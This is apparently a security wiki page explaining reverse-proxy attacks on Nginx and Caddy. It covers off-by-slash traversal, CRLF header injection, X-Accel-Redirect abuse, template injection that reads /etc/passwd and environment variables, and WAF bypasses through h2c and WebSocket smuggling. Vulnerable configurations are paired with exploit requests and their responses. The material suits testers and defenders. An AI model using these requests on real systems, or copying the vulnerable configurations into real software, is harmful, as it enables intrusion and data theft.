---
description: Servers on top of web applications that route traffic, manage headers and more
---

# Reverse Proxies

## # Related Pages

{% content-ref url="../client-side/caching.md" %}
[caching.md](../client-side/caching.md)
{% endcontent-ref %}

## Nginx

All _directives_ in Nginx are explained in this list:

{% embed url="https://nginx.org/en/docs/dirindex.html" %}
List of all Nginx directives (documentation)
{% endembed %}

The `/etc/nginx/nginx.conf` file contains the global configuration, as well as a line to include all configuration files in the `/etc/nginx/conf.d/`folder.

{% code title="nginx.conf" %}
```nginx
http {
    ...
    include /etc/nginx/conf.d/*.conf;
}
```
{% endcode %}

Because these are nested in a `http {}` context, these files will not have to open it again. You will often see extra options for the `http` context be added here, as well as `server {}` definitions per application.

Below are some common security misconfigurations that can allow for specific attacks.

### Alias with trailing slash

One classic trick in Nginx is an "off-by-slash" misconfiguration where two conditions meet:

1. `location` is _missing a_ trailing slash
2. a directive like `alias` or `proxy_pass` _with_ a trailing slash

The example below contains the vulnerability twice:

<pre class="language-nginx" data-title="Vulnerable Examples"><code class="lang-nginx">server {
    ...
<strong>    location /static {
</strong><strong>        alias /app/static/;
</strong>    }

<strong>    location /api {
</strong><strong>        proxy_pass http://backend/v1/;
</strong>    }
}
</code></pre>

The problem is that `location /static` will match **any path starting with** `/static`, also `/staticANYTHING` or `/static../anything`. What Nginx does after is _remove this prefix_, then continue with the leftover path. This may now be `../anything`, and when appended to the `static/` folder or `v1/` backend, it can **traverse one directory back**.

{% code title="Exploit" %}
```http
GET /static../index.php HTTP/1.1
```
{% endcode %}

This will create the path `/app/static/../index.php`, which may leak the sensitive source code in `/app/index.php`. Same idea with the `proxy_pass`, it could be used to access an unintended directory on the backend intended for debugging, other versions, of even another application.

### Merge Slashes

You may find a backend application vulnerable to Path Traversal using the request path, but can't get `../` sequences through to it due to an overlaying Nginx proxy which throws 400 Bad Request's whenever you traverse past the root path. For example:

* `/../../anything` -> <mark style="color:red;">**Bad Request**</mark>
* `/deep/path/../../anything` -> <mark style="color:green;">**OK**</mark>
* `/deep/path/../../../anything` -> <mark style="color:red;">**Bad Request**</mark>

If you're lucky, the `merge_slashes` is set off of its default value to `off`. In this case, Nginx will not normalize multiple slashes (eg. `//`) before performing this check, allowing you to make it think you are  in a very deep path. Then when the vulnerable application receives the URI and uses it in a file path, the multiple slashes _will_ be merged and turn into only a single one, allowing you to traverse past the root. Below is an example:

<pre class="language-nginx" data-title="Vulnerable Example"><code class="lang-nginx">server {
    ...
<strong>    merge_slashes off;
</strong>
    location / {
        proxy_pass http://app;
    }
}
</code></pre>

{% code title="Exploit" %}
```http
GET ///////../../../anything HTTP/1.1
```
{% endcode %}

{% hint style="info" %}
**Note**: If the vulnerable endpoint is somewhere deeper in a directory, you can already path traversal as deep as you are from the root path. As seen in the examples above, with `/deep/path` you can still traverse 2 directories up without being blocked. No need for `merge_slashes off;` in that case.
{% endhint %}

### Normalization & URL Decoding

Nginx will perform normalization before matching `location` directives. Specifically, it will URL-decode the path and then resolve any `../` sequences, as well as [#merge-slashes](reverse-proxies.md#merge-slashes "mention"). After doing so, it will check if the path starts with `/api`:

<pre class="language-nginx"><code class="lang-nginx"><strong>location /api {
</strong><strong>    proxy_pass http://app;
</strong>}
</code></pre>

The URL-decoded version is even sent through to the backend, making it possible to cause some strange URLs to be interpreted in unexpected ways.

<table><thead><tr><th>Request</th><th width="198">Normalized</th><th>Backend</th></tr></thead><tbody><tr><td><code>/api/../anything</code></td><td><code>/anything</code></td><td><mark style="color:red;">Doesn't match</mark> <code>/api</code></td></tr><tr><td><code>/anything/../api</code></td><td><code>/api</code></td><td><code>/anything/../api</code></td></tr><tr><td><code>/api%2Fanything</code></td><td><code>/api/anything</code></td><td><code>/api/anything</code></td></tr><tr><td><code>/anything%2f..%2fapi</code></td><td><code>/api</code></td><td><code>/anything/../api</code></td></tr></tbody></table>

When dealing with multiple layers of proxies, it may be possible to make one proxy think the path is using one prefix, while the other proxy sees a different prefix, applying rules and routing accordingly.

***

There are also ways Nginx normalizes or decodes parts of the request _to the backend_ after parsing, leading to other sorts of confusions and sometimes [#crlf-injection](reverse-proxies.md#crlf-injection "mention"). For example:

<pre class="language-nginx" data-title="Rewrite"><code class="lang-nginx">location / {
<strong>    rewrite ^/rewrite/(.*)$ /$1 break;
</strong>
    proxy_pass http://app:8000;
    proxy_set_header Host $host;
}
</code></pre>

The `rewrite` directive will match the normalized path (`$uri`), and change the `$uri` variable to the replacement in the 2nd argument. During the `proxy_pass`, it will be re-encoded and sent to the backend. This is how it would be transformed:

{% code title="Request" %}
```http
GET /rewrite/..%252Ftest HTTP/1.1
```
{% endcode %}

{% code title="Nginx -> Backend" %}
```http
GET /..%252Ftest HTTP/1.0
```
{% endcode %}

Just as expected, but let's see what happens with a regex match on the location:

<pre class="language-nginx" data-title="Regex"><code class="lang-nginx"><strong>location ~ ^/regex/(.*)$ {
</strong><strong>    proxy_pass http://app:8000/$1;
</strong>    proxy_set_header Host $host;
}
</code></pre>

Using a variable such as `$1` directly in the URL like this will cause it to stay decoded to the backend:

{% code title="Request" %}
```http
GET /regex/hello%3Fworld HTTP/1.1
```
{% endcode %}

{% code title="Nginx -> Backend" %}
```http
GET /hello?world HTTP/1.0
```
{% endcode %}

While testing for these kinds of vulnerabilities in a black-box, you should **test on all subdirectories**. Different `location` directives may have different rules. Look out for slightly different response bodies or headers to differentiate them.

### CRLF Injection

A surprising amount of sinks in Nginx also accept decoded carriage return and newline characters (`\r\n`). If a variable with this raw character is passed to such a vulnerable sink, you can inject headers into requests or responses.

First, you need to get some variable with raw `\r\n` characters. One commonly used is `$uri`, containing the _decoded path_ (see more in [#normalization-and-url-decoding](reverse-proxies.md#normalization-and-url-decoding "mention")). If your path contains `%0d%0a` characters, these will be decoded and put into the variable.

{% code title="Unsafe $uri usage" %}
```nginx
location /backend {
    proxy_pass http://backend$uri;
}
```
{% endcode %}

Another method is using [regular-expressions-regex.md](../../languages/regular-expressions-regex.md "mention") in a location to match a specific part of the URI. The value matched in a `location` directive will be URL-decoded as we learned earlier, so any matching part (like `$1`) will be as well. Importantly, a `.` cannot contain newlines, even though it should match any character. This is because of the missing _DOTALL_ flag by default. But still, a negated character set (eg. `[^abc]`) may contain newlines!

<pre class="language-nginx" data-title="Unsafe Regex"><code class="lang-nginx">location ~ /some/<a data-footnote-ref href="#user-content-fn-1">([^/]+)</a>/path {
    add_header X-Response-Header $1;
    return 200 "OK";
}
</code></pre>

To exploit this, you can inject the encoded characters into the matching group which will be decoded in the backend request:

{% code title="Exploit" %}
```http
GET /some/x%0d%0aHeader:%20Injection/path HTTP/1.1
```
{% endcode %}

{% code title="Response" %}
```http
HTTP/1.1 200 OK
Server: nginx/1.27.4
...
X-Response-Header: x
Header: Injected!

OK
```
{% endcode %}

#### Response Headers

When raw characters end up in an `add_header`, you can add more headers below that header to the response. See the example above.

Another interesting case is when `return` returns a redirect using the `Location:` header, because it is also vulnerable to CRLF-Injection:

{% code title="Vulnerable Example" %}
```nginx
location ~ /redirect/([^.]+)\.html {
    return 301 /html/$1.html;
}
```
{% endcode %}

By fitting the regex format, the `/html/$1.html` path becomes a location header with CRLF:

{% code title="Exploit" %}
```http
GET /redirect/x%0d%0aHeader:%20Injection.html HTTP/1.1
```
{% endcode %}

{% code title="Response" %}
```http
HTTP/1.1 301 Moved Permanently
...
Location: http://localhost/html/x
Header: Injection.html
```
{% endcode %}

Check out [crlf-header-injection.md](../client-side/crlf-header-injection.md "mention") to learn how to exploit this for XSS using response splitting.&#x20;

With the `Location:` header case, this becomes more tricky because you cannot simply overwrite the response and expect the browser to render it. Often there is a prefix in the location header before your input, and then there is no way to get XSS.\
As an alternative, you can still set the `Set-Cookie:` header which is allowed during redirects. This allows you to set arbitrary cookies, becoming a [#cookie-tossing](../client-side/cross-site-request-forgery-csrf.md#cookie-tossing "mention") gadget.

Lastly, the `Cache-Control:` header may come in useful if you want to poison/deceive the cache.

#### Request Headers

When unescaped characters fall into `proxy_pass` paths or `proxy_set_header` values, you can inject request header. This works similarly to [#response-headers](reverse-proxies.md#response-headers "mention"), but the exploitation is wildly different.

<pre class="language-nginx" data-title="Vulnerable Example"><code class="lang-nginx">location / {
<strong>    proxy_set_header X-Original-URI $uri;
</strong>    proxy_set_header X-Internal-Header "";
    proxy_pass http://backend;
}
</code></pre>

Above the `$uri` variable is insecurely put into a header value. The `X-Internal-Header` is also stripped from our request, presumably because the application doesn't want to user to control this.\
By injecting with a CRLF in the path, however, we can still send this header to the backend:

{% code title="Exploit" %}
```http
GET /%0d%0aX-Internal-Header:%20INJECTED HTTP/1.1
```
{% endcode %}

{% code title="What backend sees" %}
```http
GET /%0d%0aX-Internal-Header:%20INJECTED HTTP/1.0
X-Original-URI: /
X-Internal-Header: INJECTED
Host: 127.0.0.1:1337
```
{% endcode %}

This can be useful for controlling internal headers, or spoofing trusted values like `X-Client-IP`.

By injecting two CRLF sequences, you can even **end the previous HTTP request** to perform [http-request-smuggling.md](http-request-smuggling.md "mention"). If Nginx keeps the connection to the backend open, you can inject into this queue to send raw requests that wouldn't normally be allowed, desynchronize other users, or leak internal headers by playing around with the `Content-Length:`.

Importantly, the above is often possible through just a specific path. You can make a victim visit this in their browser to poison their own connection, creating a client-side desync.

### Special Response Headers

Nginx understands some special headers from the backend when proxying using `proxy_pass`. To demonstrate this, see the following configuration:

<pre class="language-nginx"><code class="lang-nginx">location /test {
    return 200 "Test";
}
location /internal {
<strong>    internal;  # Normally not accessible remotely
</strong>    return 200 "Internal";
}

location / {
    proxy_pass http://backend;
}
</code></pre>

The backend needs to have a feature or vulnerability that allows you to inject arbitrary response headers. This is also common with SSRF to an attacker's server.

{% code title="Vulnerable Example" %}
```python
@app.route('/')
def index():
    headers = json.loads(unquote(request.args.get("headers")))
    return Response("Hello, world!", headers=headers)
```
{% endcode %}

The `X-Accel-Redirect` response header will _rewrite_ the URL, and perform another evaluation and respond with that instead. If we set its value to `/internal`, the handler for `location /internal` will be used even though the requested path is still `/`. It bypasses the [`internal;`](https://nginx.org/en/docs/http/ngx_http_core_module.html#internal) check which would normally not be possible by requesting it remotely.

{% code title="Request" %}
```http
GET /?headers={"X-Accel-Redirect":"/internal"} HTTP/1.1
```
{% endcode %}

{% code title="Response" %}
```http
HTTP/1.1 200 OK
...

Internal
```
{% endcode %}

Some more internal headers you can use in combination with this are ([source](https://github.com/nginxinc/nginx-wiki/blob/master/source/start/topics/examples/x-accel.rst#x-accel)):

* `X-Accel-Charset`: set the `Content-Type:`'s charset to the given value
* `X-Accel-Buffering`: enables or disabled buffering of the response
* `X-Accel-Limit-Rate`: Bytes per second to send to the client
* `X-Accel-Expires`: When to expire the cache for this response

## Caddy

The main [`Caddyfile`](https://caddyserver.com/docs/caddyfile) controls the configuration of the proxy. You can best learn it from looking at examples online, as the documentation can be limited for some features.

### Template Injection

There are two types of templating in Caddy. Firstly, there is the `{...}` syntax enabled by default in the source code of your `Caddyfile`:

{% code title="Caddyfile" %}
```properties
(set_headers) {
    header X-Correlation-Id "{http.request.header.X-Correlation-Id}"
}

:80 {
    import set_headers
    respond "You requested {http.request.uri}"
}
```
{% endcode %}

These are called **placeholders** and are documented below:

{% embed url="https://caddyserver.com/docs/conventions#placeholders" %}
Caddy documentation for **placeholders**
{% endembed %}

When the [`templates`](https://caddyserver.com/docs/caddyfile/directives/templates) directive is set, **the response will be evaluated as a template**. Below is an example where this would be useful:

{% code title="Caddyfile" %}
```properties
:80 {
    root * /html
    templates
    file_server
}
```
{% endcode %}

{% code title="index.html" %}
```html
<p>Your UA is: {{.Req.Header.Get "User-Agent"}}</p>
```
{% endcode %}

All accessible properties and functions are documented here:

{% embed url="https://caddyserver.com/docs/modules/http.handlers.templates#docs" %}
Caddy documentation for **templates**
{% endembed %}

Internally, it uses Go's [`text/template`](https://pkg.go.dev/text/template) to evaluate the `{{...}}` syntax. Importantly this is evaluated _after_ placeholders. That means if a placeholder contains user-input, and is put into a response, the user input will be evaluated as a template! This allows you to call dangerous functions like:

* `{{env "VAR_NAME"}}`: Gets an environment variable
* `{{listFiles "/"}}`: List all files in a directory (relative to configured root)
* `{{readFile "path/to/file"}}`: Read a file (relative to configured root)

The code below is vulnerable because it puts a placeholder value in the response, while the response `template` directive is used:

<pre class="language-properties" data-title="Caddyfile"><code class="lang-properties">:80 {
    root * /
<strong>    templates
</strong><strong>    respond "You came from {http.request.header.Referer}"
</strong>}
</code></pre>

With a payload like the following, you can read arbitrary files:

<pre class="language-http" data-title="Request"><code class="lang-http">GET / HTTP/1.1
<strong>Referer: {{readFile "etc/passwd"}}
</strong></code></pre>

{% code title="Response" %}
```http
HTTP/1.1 200 OK

You came from root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```
{% endcode %}

In case your character set is limited (eg. you cannot use quotes), it is possible to read strings from other variables such as `.Req.URL.RawQuery` or an index of `.Req.Header.`:

<pre class="language-http" data-title="Request 1"><code class="lang-http">GET / HTTP/1.1
<strong>Referer: {{env .Req.URL.RawQuery}}
</strong></code></pre>

<pre class="language-http" data-title="Request 2"><code class="lang-http">GET / HTTP/1.1
<strong>Referer: {{env (index .Req.Header.X 0)}}
</strong><strong>X: SECRET_KEY
</strong></code></pre>

As an alternative to quotes, you can also use backtics (`` ` ``) to create inline strings.

## WAF Bypass

Some generic techniques for reverse proxies that act as Web Application Firewalls to block certain dangerous requests. This often includes blocking attack-like syntax such as `' OR 1=1;--` or marking certain paths as "internal only".

### Trim Paths

If it is trying to block a certain path from being accessed, such as `/admin`, you may be able to obfuscate it so that the reverse proxy doesn't recognize it anymore while the application still does.

In [#nginx](reverse-proxies.md#nginx "mention"), for example, if you make a `location = ...` rule the normalized path needs to exactly match the given location for the rule to trigger. By adding any byte to the end of the path, it won't be recognized anymore. Most applications still understand some special bytes as suffixes. The research below explores this in various different servers:

{% embed url="https://blog.bugport.net/exploiting-http-parsers-inconsistencies" %}
Various examples of how differences in parsing between proxy/server can cause bypasses
{% endembed %}

{% code title="nginx.conf" %}
```nginx
location = /admin {
    deny all;
}
```
{% endcode %}

This should prevent access to the `/admin` endpoint, but if we define a handler for it in Express.js, you can bypass it by adding the byte `\x85` to the end of your path:

{% code title="Express.js" %}
```javascript
app.get('/admin', (req, res) => {
    return res.send('ADMIN');
});
```
{% endcode %}

{% code title="Bypass Request" %}
```http
GET /admin\x85 HTTP/1.1
```
{% endcode %}

### Path Traversal

[#caddy](reverse-proxies.md#caddy "mention") also has a way to block certain paths:

```properties
:80 {
	root * /html
	respond /flag.txt 403
	file_server
}
```

In versions [< 2.4.6](https://github.com/caddyserver/caddy/pull/4407), this path was a literal equals check, meaning it was simply bypassable using:

```http
GET //flag.txt HTTP/1.1
```

Other combinations of this using `../` and encoded `%2e%2e%2f` sequences may help confuse the proxy and the backend.

### WebSocket & h2c Smuggling

If you want to communicate with the backend directly without the proxy in the way, you may be able to confuse the proxy into thinking you are speaking a binary protocol so that it doesn't try and interfere anymore. While you have such a connection with the backend, you can send it arbitrary HTTP requests and receive raw responses.

There are two techniques for this, the first involving WebSockets. To full understand the attack, read the README in this repository:

{% embed url="https://github.com/0ang3el/websocket-smuggle" %}
Research into confusing proxies and smuggling HTTP over WebSockets
{% endembed %}

Setting up a WebSocket connection typically goes like this:

1. _Client_ sends an HTTP GET request with `Upgrade: websocket`, `Sec-WebSocket-Version: 13` and `Sec-WebSocket-Key: <SOME_NONCE>` headers
2. _Proxy_ forwards this request to the backend
3. _Backend_ implements websockets for the requested endpoint, so it returns a `101` status code with a `Sec-WebSocket-Accept:` header derived from the nonce
4. _Proxy_ recognizes the status code and sees it is a successful WebSocket connection, so it switches the state of this TCP connection to allow binary data passthrough
5. _Client_ and _Backend_ can now **directly communicate** over WebSocket frames

#### Status Code not checked

An issue occurs when _Proxy_ does not check the response status code, instead it uses some other heuristic like the response headers to determine that a WebSocket connection was established. If the connection was unsuccessful in reality (like due to a wrong `Sec-WebSocket-Version: 1337` header), the backend still wants HTTP requests.

At this point the proxy has switched for forwarding raw TCP, because it thinks the connection is speaking WebSocket frames. But in reality the client can now send HTTP requests to the backend and receive raw responses, bypassing the proxy.

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption><p>Flow diagram explaining the attack to set up a direct WebSocket connection with the backend</p></figcaption></figure>

#### Return arbitrary status code

For other types of proxies that _do_ check the status code, you may still be able to confuse them by returning that correct status code through an SSRF or other mechanism that allows you to set it to 101. This can create another scenario where the proxy thinks the connection switched to WebSocket frames, and the content isn't checked.

So, by sending the backend to your server and returning a status code 101 response, which it reflects, the proxy will think a WebSocket connection has been established. Now the client can send arbitrary HTTP requests again over this connection because the proxy expects binary WebSocket frames. The backend still expects HTTP and will respond directly.

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption><p>Flow diagram with SSRF to return 101 status code</p></figcaption></figure>

#### h2c upgrade over TLS

There is another protocol we can `Upgrade:` to, named `h2c` or "HTTP/2 cleartext". This name is because regularly, HTTP/2 is only available using encrypted TLS because it is negotiated during the handshake. However, an alternative was made where a regular HTTP/1.1 connection can be upgraded to HTTP/2 using a request like the following:

```http
GET / HTTP/1.1
Host: www.example.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

The rest of the messages will now go over HTTP/2's binary protocol.

When a _Proxy_ is in the way, it will only expect an h2c upgrade when communication is cleartext (no TLS). But what if we do it on TLS anyway?

The answer to that question is what is answered in the following post and leads to this attack:

{% embed url="https://bishopfox.com/blog/h2c-smuggling-request" %}
Explaining smuggling requests with h2c over TLS
{% endembed %}

It turns out that proxies who forward the upgrade headers to the backend, will receive the 101 Switching Protocols response, and proceed to set up a binary tunnel between the client and the server. Since it speaks HTTP/2 now, the proxy won't look at it anymore and you as the client can send arbitrary requests to the backend and receive raw responses.

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption><p>Flow diagram for setting up h2c connection</p></figcaption></figure>

Note that the backend server has to support h2c upgrades for this to work, which is often a manual setting. The tool below can test and exploit this easily given a URL:

{% embed url="https://github.com/assetnote/h2csmuggler" %}
Tool to check and smuggle requests using h2c over TLS to bypass proxy rules
{% endembed %}

[^1]: This group may contain newlines, saved to `$1`
